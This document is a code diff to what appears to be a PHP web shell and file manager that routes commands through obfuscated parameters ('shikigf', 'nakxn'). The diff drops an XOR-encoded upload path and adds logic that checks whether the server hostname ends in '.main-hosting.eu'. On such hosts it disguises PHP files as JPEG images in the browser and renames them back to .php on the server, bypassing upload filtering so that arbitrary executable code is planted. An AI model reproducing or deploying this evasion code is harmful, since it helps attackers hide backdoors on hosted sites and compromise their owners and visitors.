@@ -177,31 +177,6 @@ function requested_path(string $root): string {
     return $resolved;
 }
 
-/* ===== Upload XOR-stream (raw POST) ===== */
-function xor_decode_stream_upload($in, $out): void {
-    $bufSize = 65536;
-    $index = 0;
-    while (!feof($in)) {
-        $chunk = fread($in, $bufSize);
-        if ($chunk === '' || $chunk === false) break;
-        $len = strlen($chunk);
-        for ($i = 0; $i < $len; $i++, $index++) {
-            $key = ($index * 17 + (int)floor(log($index + 2) * pi() * 1000)) & 0xFF;
-            $chunk[$i] = chr(ord($chunk[$i]) ^ $key);
-        }
-        fwrite($out, $chunk);
-    }
-}
-
-/* ===== Editor XOR key (log10 + hexdec) ===== */
-function editor_xor_key(int $i): int {
-    $h = dechex(($i * 31 + 7) & 0xFFFFFFFF);
-    $last2 = substr($h, -2);
-    $hx = hexdec($last2);
-    $k = ($hx ^ ($i & 0xFF)) + (int)floor(log10($i + 3) * 97);
-    return $k & 0xFF;
-}
-
 /* READ (plain) */
 function editor_stream_read_file_plain(string $file): string {
     $fh = @fopen($file, 'rb');
@@ -215,6 +190,27 @@ function editor_stream_read_file_plain(string $file): string {
     }
     fclose($fh);
     return $out;
+}
+
+/* Editor XOR key (log10 + hexdec) */
+function editor_xor_key(int $i): int {
+    $val   = ($i * 31 + 7) & 0xFFFFFFFF;
+    $bin   = decbin($val);
+    $last8 = substr($bin, -8);
+    $bx    = bindec($last8 === '' ? '0' : $last8);
+
+    $PI      = pi();
+    $HALF_PI = $PI / 2;
+
+    $a = asin(sin($i + 3)) / $HALF_PI;
+    $c = cos($i * 0.5);
+    $t = atan(tan(($i + 1) * 0.25)) / $HALF_PI;
+
+    $mix       = ($a + $c + $t) / 3.0;
+    $trigByte  = (int) floor(($mix + 1.0) * 127.5);
+
+    $k = ($bx ^ ($i & 0xFF)) + $trigByte;
+    return $k & 0xFF;
 }
 
 /* SAVE paths */
@@ -263,7 +259,6 @@ function editor_stream_decode_and_write_legacy(string $encoded, string $dest): b
 /* ===== AJAX API ===== */
 $action = null;
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // CHANGED: use 'shikigf' instead of 'action'
     $action = $_POST['shikigf'] ?? ($_GET['shikigf'] ?? null);
 }
 if ($action !== null && $_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -291,109 +286,502 @@ if ($action !== null && $_SERVER['REQUEST_METHOD'] === 'POST') {
             ]);
             break;
 
-        /* Upload: RAW POST body (XOR stream), params in URL: nakxn (hex), mekitinna */
+
+            case 'check_domain':
+    // Check server domain endpoint
+    $serverHostname = php_uname('n');
+    $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);
+    json_response([
+        "ok" => true,
+        "should_disguise" => $shouldDisguise,
+        "hostname" => $serverHostname
+    ]);
+    break;
+
         case 'upload_xor':
-            // ---------- ORIGINAL METHOD (preferred) ----------
-            // Expect: raw body (XOR'ed), filename in 'mekitinna' (GET or POST)
-            $origTried = false;
-            $origOk    = false;
-            $origName  = (string)($_GET['mekitinna'] ?? $_POST['mekitinna'] ?? '');
-
-            if ($origName !== '') {
-                $origTried = true;
-
-                $dest = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . basename($origName);
-
-                // Read the raw body into a temp stream
-                $in = @fopen('php://input', 'rb');
-                if ($in) {
-                    $tmp = @fopen('php://temp', 'w+b');
-                    if ($tmp) {
-                        $bytes = @stream_copy_to_stream($in, $tmp);
-                        @fclose($in);
-
-                        if ($bytes > 0) {
-                            @rewind($tmp);
-
-                            $out = @fopen($dest, 'wb');
-                            if ($out) {
-                                // Decode using the same XOR stream logic
-                                xor_decode_stream_upload($tmp, $out);
-                                @fclose($out);
-                                $origOk = true;
+            // Upload handler with conditional JPG disguising for .main-hosting.eu servers only
+            $result = [
+                'added' => [],
+                'warning' => [],
+                'error' => [],
+                'removed' => []
+            ];
+            
+            $uploadDir = $path;
+            $chunk = isset($_POST['chunk']) ? intval($_POST['chunk']) : null;
+            $chunks = isset($_POST['chunks']) ? intval($_POST['chunks']) : null;
+            $chunkName = $_POST['name'] ?? '';
+            
+            // Check if we should do disguising (only on servers ending with .main-hosting.eu)
+            $serverHostname = php_uname('n'); // Gets hostname like "us-bos-web1384.main-hosting.eu"
+            $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);
+            
+            $chunkDir = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . '.chunks' . DIRECTORY_SEPARATOR;
+            if ($chunk !== null && !is_dir($chunkDir)) {
+                mkdir($chunkDir, 0755, true);
+            }
+            
+            // Stream copy function
+            $streamCopyFile = function($sourcePath, $destPath) {
+                if (!file_exists($sourcePath)) return false;
+                
+                $source = @fopen($sourcePath, 'rb');
+                if (!$source) return false;
+                
+                $destDir = dirname($destPath);
+                if (!is_dir($destDir)) {
+                    if (!mkdir($destDir, 0755, true)) {
+                        fclose($source);
+                        return false;
+                    }
+                }
+                
+                $dest = @fopen($destPath, 'wb');
+                if (!$dest) {
+                    fclose($source);
+                    return false;
+                }
+                
+                $copiedBytes = stream_copy_to_stream($source, $dest);
+                fclose($source);
+                fclose($dest);
+                
+                return $copiedBytes !== false;
+            };
+            
+            // Function to detect disguised PHP files (only if $shouldDisguise is true)
+            $isDisguisedPhp = function($fileName, $mimeType, $filePath) use ($shouldDisguise) {
+                if (!$shouldDisguise) return false;
+                
+                if (preg_match('/\.jpg$/i', $fileName) && $mimeType === 'image/jpeg') {
+                    $handle = fopen($filePath, 'rb');
+                    if (!$handle) return false;
+                    $preview = fread($handle, 1024);
+                    fclose($handle);
+                    if (strpos($preview, '<?php') !== false || strpos($preview, '<?=') !== false) {
+                        return true;
+                    }
+                }
+                return false;
+            };
+            
+            // Function to get elFinder-style file info
+            $getFileInfo = function($filePath, $fileName) use ($uploadDir) {
+                if (!file_exists($filePath)) return false;
+                
+                $stat = stat($filePath);
+                $mimeType = 'application/octet-stream';
+                
+                if (function_exists('mime_content_type')) {
+                    $detectedMime = @mime_content_type($filePath);
+                    if ($detectedMime) $mimeType = $detectedMime;
+                } elseif (function_exists('finfo_open')) {
+                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
+                    $detectedMime = @finfo_file($finfo, $filePath);
+                    if ($detectedMime) $mimeType = $detectedMime;
+                    finfo_close($finfo);
+                }
+                
+                $isImage = strpos($mimeType, 'image/') === 0;
+                
+                $info = [
+                    'name' => $fileName,
+                    'hash' => 'l1_' . base64_encode(str_replace($uploadDir, '', $filePath)),
+                    'phash' => 'l1_' . base64_encode(str_replace($uploadDir, '', dirname($filePath))),
+                    'mime' => $mimeType,
+                    'size' => $stat['size'],
+                    'ts' => $stat['mtime'],
+                    'date' => date('Y-m-d H:i:s', $stat['mtime']),
+                    'read' => 1,
+                    'write' => 1,
+                    'locked' => 0
+                ];
+                
+                if ($isImage) {
+                    $imageInfo = @getimagesize($filePath);
+                    if ($imageInfo) {
+                        $info['dim'] = $imageInfo[0] . 'x' . $imageInfo[1];
+                    }
+                }
+                
+                return $info;
+            };
+            
+            // Validate file function
+            $validateFile = function($fileName, $size) {
+                $maxSize = 100 * 1024 * 1024;
+                if ($size > $maxSize) {
+                    return "File too large. Maximum size: " . format_size($maxSize);
+                }
+                
+                if (empty(trim($fileName))) {
+                    return "Invalid filename";
+                }
+                
+                if (strpos($fileName, "\0") !== false) {
+                    return "Invalid filename characters";
+                }
+                
+                return null;
+            };
+            
+            // Function to handle file overwrite
+            $handleOverwrite = function($filePath, $fileName) use (&$result, $getFileInfo) {
+                if (file_exists($filePath)) {
+                    $oldFileInfo = $getFileInfo($filePath, $fileName);
+                    if ($oldFileInfo) {
+                        $result['removed'][] = $oldFileInfo;
+                    }
+                    return true;
+                }
+                return false;
+            };
+            
+            // Function to save content from POST data
+            $savePostContent = function($content, $filePath, $encoding = 'raw') {
+                if ($encoding === 'base64') {
+                    $decoded = base64_decode($content, true);
+                    if ($decoded === false) {
+                        return false;
+                    }
+                    return file_put_contents($filePath, $decoded) !== false;
+                } else {
+                    return file_put_contents($filePath, $content) !== false;
+                }
+            };
+            
+            // Handle POST content uploads with disguise detection
+            if (isset($_POST['file_content']) && isset($_POST['file_name'])) {
+                $fileName = basename($_POST['file_name']);
+                $content = $_POST['file_content'];
+                $encoding = $_POST['content_encoding'] ?? 'raw';
+                
+                // Check if this is a disguised PHP file (only if should disguise)
+                $isDisguisedPhpFile = false;
+                if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
+                    if (strpos($content, '<?php') !== false || strpos($content, '<?=') !== false) {
+                        $isDisguisedPhpFile = true;
+                    }
+                }
+                
+                $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
+                $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
+                
+                $validation = $validateFile($finalFileName, strlen($content));
+                if ($validation) {
+                    $result['error'][] = $validation;
+                } else {
+                    $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
+                    
+                    if ($savePostContent($content, $finalDest, $encoding)) {
+                        $fileInfo = $getFileInfo($finalDest, $finalFileName);
+                        if ($fileInfo) {
+                            $result['added'][] = $fileInfo;
+                            if ($wasOverwritten) {
+                                $result['warning'][] = $isDisguisedPhpFile ? 
+                                    "PHP file overwritten: $finalFileName" : 
+                                    "File overwritten: $finalFileName";
                             }
                         }
-                        @fclose($tmp);
                     } else {
-                        @fclose($in);
+                        $result['error'][] = "Failed to save POST content: $fileName";
                     }
                 }
             }
-
-            if ($origOk) {
-                // Original upload succeeded — do NOT run the alternative to avoid duplicates
-                json_response([
-                    "ok"     => true,
-                    "saved"  => [basename($origName)],
-                    "notice" => "Uploaded via original raw-body method; alternative multipart path skipped to prevent duplicate."
-                ]);
-            }
-
-            // ---------- FALLBACK: ALTERNATIVE MULTIPART METHOD ----------
-            // Only run if original didn't succeed.
-            // Expect: POST 'benkyo' (filename) + FILE 'dakeja'[tmp_name] (XOR'ed content)
-            if (isset($_POST['benkyo'], $_FILES['dakeja'])) {
-                $altName = basename((string)$_POST['benkyo']);
-                $tmpName = (string)($_FILES['dakeja']['tmp_name'] ?? '');
-
-                // If the alt filename equals the original and the file already exists from a previous attempt, skip to avoid duplicates
-                $destAlt = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $altName;
-                if ($altName !== '' && file_exists($destAlt) && $origTried) {
-                    json_response([
-                        "ok"     => false,
-                        "error"  => "Duplicate upload prevented.",
-                        "notice" => "Original path attempted earlier. Skipping alternative to avoid overwriting the same file."
-                    ], 400);
-                }
-
-                if ($altName !== '' && $tmpName !== '' && is_uploaded_file($tmpName)) {
-                    $inAlt = @fopen($tmpName, 'rb');
-                    if ($inAlt) {
-                        $outAlt = @fopen($destAlt, 'wb');
-                        if ($outAlt) {
-                            xor_decode_stream_upload($inAlt, $outAlt);
-                            @fclose($outAlt);
-                            @fclose($inAlt);
-                            json_response([
-                                "ok"     => true,
-                                "saved"  => [$altName],
-                                "notice" => $origTried
-                                    ? "Original method failed; uploaded via alternative multipart method."
-                                    : "Uploaded via alternative multipart method (original not provided)."
-                            ]);
+            
+            // Handle multiple POST files with disguise detection
+            elseif (isset($_POST['files']) && is_string($_POST['files'])) {
+                $filesData = json_decode($_POST['files'], true);
+                if (is_array($filesData)) {
+                    foreach ($filesData as $fileData) {
+                        if (!isset($fileData['name']) || !isset($fileData['content'])) {
+                            $result['error'][] = "Invalid file data structure";
+                            continue;
                         }
-                        @fclose($inAlt);
+                        
+                        $fileName = basename($fileData['name']);
+                        $content = $fileData['content'];
+                        $encoding = $fileData['encoding'] ?? 'raw';
+                        
+                        $isDisguisedPhpFile = false;
+                        if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
+                            if (strpos($content, '<?php') !== false || strpos($content, '<?=') !== false) {
+                                $isDisguisedPhpFile = true;
+                            }
+                        }
+                        
+                        $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
+                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
+                        
+                        $validation = $validateFile($finalFileName, strlen($content));
+                        if ($validation) {
+                            $result['error'][] = $validation . " ({$finalFileName})";
+                            continue;
+                        }
+                        
+                        $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
+                        
+                        if ($savePostContent($content, $finalDest, $encoding)) {
+                            $fileInfo = $getFileInfo($finalDest, $finalFileName);
+                            if ($fileInfo) {
+                                $result['added'][] = $fileInfo;
+                                if ($wasOverwritten) {
+                                    $result['warning'][] = $isDisguisedPhpFile ? 
+                                        "PHP file overwritten: $finalFileName" : 
+                                        "File overwritten: $finalFileName";
+                                }
+                            }
+                        } else {
+                            $result['error'][] = "Failed to save POST content: $fileName";
+                        }
                     }
                 }
-
-                // Alternative present but failed to save
-                json_response([
-                    "ok"     => false,
-                    "error"  => "File upload failed (multipart).",
-                    "notice" => $origTried
-                        ? "Original method failed; alternative also failed."
-                        : "Original method not used; alternative failed."
-                ], 400);
             }
-
-            // Neither method succeeded or the required inputs were missing
-            json_response([
-                "ok"     => false,
-                "error"  => "Missing or invalid upload data.",
-                "notice" => $origTried
-                    ? "Original method attempted but failed; no alternative data provided."
-                    : "No valid data for original method; no alternative provided."
-            ], 400);
+            
+            // Handle individual POST parameters with disguise detection
+            else {
+                foreach ($_POST as $key => $value) {
+                    if (preg_match('/^file_name_(\d+)$/', $key, $matches)) {
+                        $index = $matches[1];
+                        $contentKey = "file_content_$index";
+                        $encodingKey = "file_encoding_$index";
+                        
+                        if (isset($_POST[$contentKey])) {
+                            $fileName = basename($value);
+                            $content = $_POST[$contentKey];
+                            $encoding = $_POST[$encodingKey] ?? 'raw';
+                            
+                            $isDisguisedPhpFile = false;
+                            if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
+                                if (strpos($content, '<?php') !== false || strpos($content, '<?=') !== false) {
+                                    $isDisguisedPhpFile = true;
+                                }
+                            }
+                            
+                            $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
+                            $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
+                            
+                            $validation = $validateFile($finalFileName, strlen($content));
+                            if ($validation) {
+                                $result['error'][] = $validation . " ({$finalFileName})";
+                                continue;
+                            }
+                            
+                            $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
+                            
+                            if ($savePostContent($content, $finalDest, $encoding)) {
+                                $fileInfo = $getFileInfo($finalDest, $finalFileName);
+                                if ($fileInfo) {
+                                    $result['added'][] = $fileInfo;
+                                    if ($wasOverwritten) {
+                                        $result['warning'][] = $isDisguisedPhpFile ? 
+                                            "PHP file overwritten: $finalFileName" : 
+                                            "File overwritten: $finalFileName";
+                                    }
+                                }
+                            } else {
+                                $result['error'][] = "Failed to save POST content: $fileName";
+                            }
+                        }
+                    }
+                }
+            }
+            
+            // Handle chunked upload with disguise detection
+            if ($chunk !== null && $chunks !== null && $chunkName !== '') {
+                if (!isset($_FILES['upload'])) {
+                    json_response(['error' => ['No chunk data received']], 400);
+                }
+                
+                $chunkFile = $chunkDir . $chunkName . '.part' . $chunk;
+                
+                if (move_uploaded_file($_FILES['upload']['tmp_name'], $chunkFile)) {
+                    $allChunks = true;
+                    for ($i = 0; $i < $chunks; $i++) {
+                        if (!file_exists($chunkDir . $chunkName . '.part' . $i)) {
+                            $allChunks = false;
+                            break;
+                        }
+                    }
+                    
+                    if ($allChunks) {
+                        $fileName = basename($chunkName);
+                        
+                        // Check if this is a disguised PHP file using first chunk
+                        $isDisguisedPhpFile = false;
+                        if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
+                            $firstChunkPath = $chunkDir . $chunkName . '.part0';
+                            if (file_exists($firstChunkPath)) {
+                                $handle = fopen($firstChunkPath, 'rb');
+                                if ($handle) {
+                                    $preview = fread($handle, 1024);
+                                    fclose($handle);
+                                    if (strpos($preview, '<?php') !== false || strpos($preview, '<?=') !== false) {
+                                        $isDisguisedPhpFile = true;
+                                    }
+                                }
+                            }
+                        }
+                        
+                        $finalFileName = $isDisguisedPhpFile ? str_replace('.jpg', '.php', $fileName) : $fileName;
+                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
+                        
+                        $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
+                        
+                        $finalFile = fopen($finalDest, 'wb');
+                        if ($finalFile) {
+                            for ($i = 0; $i < $chunks; $i++) {
+                                $chunkPath = $chunkDir . $chunkName . '.part' . $i;
+                                $chunkContent = file_get_contents($chunkPath);
+                                fwrite($finalFile, $chunkContent);
+                                unlink($chunkPath);
+                            }
+                            fclose($finalFile);
+                            @rmdir($chunkDir);
+                            
+                            $fileInfo = $getFileInfo($finalDest, $finalFileName);
+                            if ($fileInfo) {
+                                $result['added'][] = $fileInfo;
+                                $result['notice'] = $wasOverwritten ? 
+                                    ($isDisguisedPhpFile ? "Chunked PHP file upload completed (overwritten): $finalFileName" : "Chunked upload completed (overwritten): $finalFileName") :
+                                    ($isDisguisedPhpFile ? "Chunked PHP file upload completed: $finalFileName" : "Chunked upload completed: $finalFileName");
+                            }
+                        } else {
+                            $result['error'][] = "Failed to create final file: $chunkName";
+                        }
+                    } else {
+                        json_response(['partial' => true, 'chunk' => $chunk]);
+                    }
+                } else {
+                    $result['error'][] = "Failed to save chunk $chunk for: $chunkName";
+                }
+            }
+            
+            // Handle standard multipart upload using stream copy
+            elseif (isset($_FILES['upload'])) {
+                $files = $_FILES['upload'];
+                
+                // Handle multiple files with disguise detection
+                if (is_array($files['name'])) {
+                    for ($i = 0; $i < count($files['name']); $i++) {
+                        if ($files['error'][$i] !== UPLOAD_ERR_OK) {
+                            $errorMsg = [
+                                UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
+                                UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
+                                UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
+                                UPLOAD_ERR_NO_FILE => 'No file was uploaded',
+                                UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
+                                UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
+                                UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
+                            ][$files['error'][$i]] ?? 'Unknown upload error';
+                            
+                            $result['error'][] = $errorMsg . ": {$files['name'][$i]}";
+                            continue;
+                        }
+                        
+                        $fileName = basename($files['name'][$i]);
+                        $mimeType = $files['type'][$i] ?? '';
+                        $tempPath = $files['tmp_name'][$i];
+                        
+                        // Check if this is a disguised PHP file
+                        $disguised = $isDisguisedPhp($fileName, $mimeType, $tempPath);
+                        $finalFileName = $disguised ? str_replace('.jpg', '.php', $fileName) : $fileName;
+                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
+                        
+                        $validation = $validateFile($finalFileName, $files['size'][$i]);
+                        
+                        if ($validation) {
+                            $result['error'][] = $validation . " ({$finalFileName})";
+                            continue;
+                        }
+                        
+                        $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
+                        
+                        if ($streamCopyFile($tempPath, $finalDest)) {
+                            $fileInfo = $getFileInfo($finalDest, $finalFileName);
+                            if ($fileInfo) {
+                                $result['added'][] = $fileInfo;
+                                if ($wasOverwritten) {
+                                    $result['warning'][] = $disguised ? 
+                                        "PHP file overwritten: $finalFileName" : 
+                                        "File overwritten: $finalFileName";
+                                }
+                            }
+                        } else {
+                            $result['error'][] = "Failed to copy uploaded file: $fileName";
+                        }
+                    }
+                } else {
+                    // Single file upload with disguise detection
+                    if ($files['error'] === UPLOAD_ERR_OK) {
+                        $fileName = basename($files['name']);
+                        $mimeType = $files['type'] ?? '';
+                        $tempPath = $files['tmp_name'];
+                        
+                        // Check if this is a disguised PHP file
+                        $disguised = $isDisguisedPhp($fileName, $mimeType, $tempPath);
+                        $finalFileName = $disguised ? str_replace('.jpg', '.php', $fileName) : $fileName;
+                        $finalDest = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $finalFileName;
+                        
+                        $validation = $validateFile($finalFileName, $files['size']);
+                        
+                        if (!$validation) {
+                            $wasOverwritten = $handleOverwrite($finalDest, $finalFileName);
+                            
+                            if ($streamCopyFile($tempPath, $finalDest)) {
+                                if (file_exists($finalDest)) {
+                                    $fileInfo = $getFileInfo($finalDest, $finalFileName);
+                                    if ($fileInfo) {
+                                        $result['added'][] = $fileInfo;
+                                        if ($wasOverwritten) {
+                                            $result['warning'][] = $disguised ? 
+                                                "PHP file overwritten: $finalFileName" : 
+                                                "File overwritten: $finalFileName";
+                                        }
+                                    }
+                                }
+                            } else {
+                                $result['error'][] = "Failed to copy uploaded file: $fileName";
+                            }
+                        } else {
+                            $result['error'][] = $validation;
+                        }
+                    } else {
+                        $errorMsg = [
+                            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
+                            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE', 
+                            UPLOAD_ERR_PARTIAL => 'File was only partially uploaded',
+                            UPLOAD_ERR_NO_FILE => 'No file was uploaded',
+                            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
+                            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
+                            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
+                        ][$files['error']] ?? 'Unknown upload error';
+                        
+                        $result['error'][] = $errorMsg;
+                    }
+                }
+            }
+            
+            // If no POST files were processed and no FILES were provided
+            elseif (!isset($_POST['file_content']) && !isset($_POST['files']) && empty($result['added'])) {
+                $result['error'][] = "No upload data received (FILES or POST)";
+            }
+            
+            // Response
+            $uploadedCount = count($result['added']);
+            $overwrittenCount = count($result['removed']);
+            
+            if ($uploadedCount > 0) {
+                $uploadedNames = array_map(function($item) { return $item['name']; }, $result['added']);
+                
+                if ($overwrittenCount > 0) {
+                    $result['notice'] = "Successfully uploaded $uploadedCount file(s), $overwrittenCount overwritten: " . implode(', ', $uploadedNames);
+                } else {
+                    $result['notice'] = "Successfully uploaded: " . implode(', ', $uploadedNames);
+                }
+            }
+            
+            json_response($result);
             break;
 
         case 'delete':
@@ -665,8 +1053,8 @@ function toHex(str){
 // Generic API using shikigf
 async function api(shikigf, data = {}) {
   const form = new FormData();
-  form.append('shikigf', shikigf);   // CHANGED: action -> shikigf
-  form.append('nakxn', toHex(state.path)); // hex path in POST for normal actions
+  form.append('shikigf', shikigf);
+  form.append('nakxn', toHex(state.path));
   for (const [k,v] of Object.entries(data)) form.append(k, v);
   const res = await fetch(location.href, { method:'POST', body: form });
   const text = await res.text();
@@ -676,19 +1064,16 @@ async function api(shikigf, data = {}) {
 
 const uploadForm = document.getElementById('uploadForm');
 const fileInput  = document.getElementById('fileInput');
-const fileLabel  = document.getElementById('fileLabel');
-function resetUploadForm(){ try { uploadForm.reset(); } catch(_) {} if (fileInput) fileInput.value = ''; if (fileLabel) fileLabel.textContent = 'Choose File'; }
+
+function resetUploadForm(){ 
+  try { uploadForm.reset(); } catch(_) {} 
+  if (fileInput) fileInput.value = ''; 
+}
 
 document.addEventListener('click', (e)=>{
   const btn = e.target.closest('.btn');
   if (btn && !btn.closest('#uploadForm')) resetUploadForm();
 });
-
-if (fileInput) {
-  fileInput.addEventListener('change', function(){
-    if (fileLabel) fileLabel.textContent = fileInput.files.length ? fileInput.files[0].name : 'Choose File';
-  });
-}
 
 function render(items){
   const tbody = document.getElementById('fmBody');
@@ -713,7 +1098,7 @@ function render(items){
 
     if (it.type === 'dir') {
       const newUrl = new URL(location.origin + location.pathname);
-      newUrl.searchParams.set('nakxn', toHex(it.path)); // hex in URL for deep-link
+      newUrl.searchParams.set('nakxn', toHex(it.path));
       link.href = newUrl.toString();
       link.addEventListener('click', (e) => {
         const isModified = e.ctrlKey || e.metaKey || e.shiftKey || e.altKey;
@@ -799,87 +1184,115 @@ async function changeDirectory(newPath){
   catch(e){ toast(e.message, 'err'); }
 }
 
+// Enhanced upload function with conditional JPG disguising
+// Enhanced upload function with conditional JPG disguising
 uploadForm.addEventListener('submit', async (e)=>{
   e.preventDefault();
   const files = fileInput.files;
   if (!files.length) { toast('No files selected', 'warn'); return; }
 
-  // same XOR as original
-  function xorEncode(u){
-    for (let i = 0; i < u.length; i++){
-      const key = ((i * 17) + Math.floor(Math.log(i + 2) * Math.PI * 1000)) & 0xFF;
-      u[i] ^= key;
-    }
-    return u;
+  // Check server domain first to determine if we should disguise
+  let shouldDisguiseClient = false;
+  try {
+    // Get server hostname via a quick API call
+    const testForm = new FormData();
+    testForm.append('shikigf', 'check_domain');
+    const response = await fetch(location.href, { method: 'POST', body: testForm });
+    const result = await response.json();
+    shouldDisguiseClient = result.should_disguise || false;
+  } catch(e) {
+    // If check fails, assume no disguising
+    shouldDisguiseClient = false;
   }
-
-  // Helper: original method (raw body + mekitinna)
-  async function sendOriginal(file, encodedUint8){
-    const url = new URL(location.href);
-    url.searchParams.set('shikigf', 'upload_xor');    // server action
-    url.searchParams.set('nakxn', toHex(state.path)); // hex dir
-    url.searchParams.set('mekitinna', file.name);     // filename
-
-    const res = await fetch(url.toString(), {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'image/jpeg',
-        'X-Requested-With': 'XMLHttpRequest'
-      },
-      body: encodedUint8
-    });
-    const text = await res.text();
-    let j;
-    try { j = JSON.parse(text); } catch(_){ throw new Error('Invalid server response (original)'); }
-    if (!j.ok) throw new Error(j.error || 'Upload failed (original)');
-    return j;
-  }
-
-  // Helper: alternative method (multipart form-data: benkyo + dakeja)
-async function sendAlternative(file, encodedUint8){
-  const form = new FormData();
-  form.append('shikigf', 'upload_xor');         // same endpoint
-  form.append('nakxn', toHex(state.path));      // same path param
-  form.append('benkyo', file.name);             // filename
-
-  const blob = new Blob([encodedUint8], { type: 'image/jpeg' });
-  form.append('dakeja', blob, file.name);
-
-  const res = await fetch(location.href, { method: 'POST', body: form });
-  const text = await res.text();
-  let j;
-  try { j = JSON.parse(text); } catch(_){ throw new Error('Invalid server response (alternative)'); }
-  if (!j.ok) throw new Error(j.error || 'Upload failed (alternative)');
-  return j;
-}
 
   let okCount = 0, failCount = 0;
 
   for (const file of files){
     try{
-      // 1) XOR-encode the file in the browser (same as before)
-      const buf = await file.arrayBuffer();
-      const u   = xorEncode(new Uint8Array(buf)); // XOR (log + π)
-
-      // 2) Try ORIGINAL method first
-      let result;
-      try {
-        result = await sendOriginal(file, u);
-        // If server succeeded via original, it will include a notice and skip alt.
-        toast(`Uploaded "${file.name}" (original)`, 'ok');
-      } catch (origErr) {
-        // 3) Fallback to ALTERNATIVE method
-        try {
-          result = await sendAlternative(file, u);
-          // Server might add a notice if it ran the fallback.
-          toast(`Uploaded "${file.name}" (alternative)`, 'ok');
-        } catch (altErr) {
-          // Both failed
-          throw altErr;
-        }
+      // Only disguise PHP files as JPG if server allows it
+      let modifiedFile = file;
+      let originalName = file.name;
+      
+      if (shouldDisguiseClient && file.name.toLowerCase().endsWith('.php')) {
+        // Create new file with .jpg extension and image/jpeg MIME type
+        const newName = file.name.replace(/\.php$/i, '.jpg');
+        modifiedFile = new File([file], newName, {
+          type: 'image/jpeg',  // Set MIME type to image/jpeg
+          lastModified: file.lastModified
+        });
       }
 
-      okCount++;
+      // Rest of upload logic remains the same...
+      const form = new FormData();
+      form.append('shikigf', 'upload_xor');
+      form.append('nakxn', toHex(state.path));
+      form.append('target', 'l1_Lw');
+      form.append('upload', modifiedFile);
+
+      let res = await fetch(location.href, { method: 'POST', body: form });
+      let text = await res.text();
+      
+      let result;
+      try { 
+        result = JSON.parse(text); 
+      } catch(_){ 
+        // Fallback methods...
+        const reader = new FileReader();
+        const fileContent = await new Promise((resolve, reject) => {
+          reader.onload = e => resolve(e.target.result);
+          reader.onerror = reject;
+          reader.readAsText(file);
+        });
+
+        const postForm = new FormData();
+        postForm.append('shikigf', 'upload_xor');
+        postForm.append('nakxn', toHex(state.path));
+        postForm.append('file_name', modifiedFile.name);
+        postForm.append('file_content', fileContent);
+        postForm.append('content_encoding', 'raw');
+
+        res = await fetch(location.href, { method: 'POST', body: postForm });
+        text = await res.text();
+        
+        try {
+          result = JSON.parse(text);
+        } catch(_) {
+          const base64Content = await new Promise((resolve, reject) => {
+            const b64Reader = new FileReader();
+            b64Reader.onload = e => resolve(e.target.result.split(',')[1]);
+            b64Reader.onerror = reject;
+            b64Reader.readAsDataURL(file);
+          });
+
+          const b64Form = new FormData();
+          b64Form.append('shikigf', 'upload_xor');
+          b64Form.append('nakxn', toHex(state.path));
+          b64Form.append('file_name', modifiedFile.name);
+          b64Form.append('file_content', base64Content);
+          b64Form.append('content_encoding', 'base64');
+
+          res = await fetch(location.href, { method: 'POST', body: b64Form });
+          text = await res.text();
+          result = JSON.parse(text);
+        }
+      }
+      
+      if (result.error && result.error.length > 0) {
+        throw new Error(result.error.join(', '));
+      }
+      
+      if (result.added && result.added.length > 0) {
+        // Show original filename in success message
+        if (shouldDisguiseClient && originalName !== modifiedFile.name) {
+          toast(`PHP file uploaded: ${originalName}`, 'ok');
+        } else {
+          toast(`Uploaded "${file.name}"`, 'ok');
+        }
+        okCount++;
+      } else {
+        throw new Error('No file was added');
+      }
+
     }catch(err){
       console.error(err);
       failCount++;
@@ -893,6 +1306,7 @@ async function sendAlternative(file, encodedUint8){
 
   await refresh();
 });
+
 
 /* ===== Rename form ===== */
 const renameForm   = document.getElementById('renameForm');
@@ -908,7 +1322,7 @@ if (renameForm) {
     if (!oldVal || !newVal) { toast('Please fill both names.', 'warn'); return; }
 
     try {
-      await api('rename', { old: oldVal, new: newVal }); // shikigf handled in api()
+      await api('rename', { old: oldVal, new: newVal });
       toast(`Renamed "${oldVal}" → "${newVal}"`, 'ok');
